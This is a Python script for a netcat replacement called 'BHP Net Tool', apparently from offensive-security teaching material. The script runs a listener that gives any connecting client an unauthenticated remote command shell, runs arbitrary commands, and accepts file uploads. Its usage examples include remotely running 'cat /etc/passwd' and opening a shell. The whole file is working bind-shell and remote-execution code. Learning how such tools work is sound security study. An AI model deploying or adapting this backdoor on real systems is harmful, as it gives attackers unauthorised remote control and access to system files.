import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    """
    Executes a command and returns the output as a string.
    """
    cmd = cmd.strip()
    if not cmd:
        return ""
    # subprocess.check_output runs the command and returns the result
    try:
        output = subprocess.check_output(shlex.split(cmd),
                                          stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # Create a TCP/IP socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow the port to be reused immediately after closing
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        # Connect to the target and port
        self.socket.connect((self.args.target, self.args.port))

        # If there is initial data (like a command or file content), send it
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break

                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        # Bind to the target and port for a listener
        # Using 0.0.0.0 as default ensures it binds to all available interfaces
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"[*] Listening on {self.args.target}:{self.args.port}...")
        while True:
            client_socket, _ = self.socket.accept()
            # Start a new thread for every connection to handle multiple clients
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server disconnected or error: {e}')
                    break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
echo "ABC" | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
netcat.py -t 192.168.1.108 -p 5555 # connect to server
'''))

    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='specified IP (default: 0.0.0.0)')
    parser.add_argument('-u', '--upload', help='upload file')

    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()

